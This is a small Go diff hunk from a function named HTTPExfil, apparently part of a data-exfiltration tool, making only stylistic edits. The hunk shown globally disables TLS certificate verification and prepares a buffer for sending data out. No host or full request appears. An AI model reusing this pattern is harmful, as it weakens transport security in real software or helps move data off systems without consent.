@@ -134,11 +134,10 @@ func HTTPExfil(
 		var e error
 		var n int
 		var req *http.Request
-		var stream = bytes.NewReader(b)
+		var stream *bytes.Reader = bytes.NewReader(b)
 		var tmp [4 * 1024 * 1024]byte
 
-		http.DefaultTransport.(*http.Transport).TLSClientConfig =
-			&tls.Config{InsecureSkipVerify: true}
+		http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
 
 		// Set timeout to 1 second
 		http.DefaultClient.Timeout = time.Second
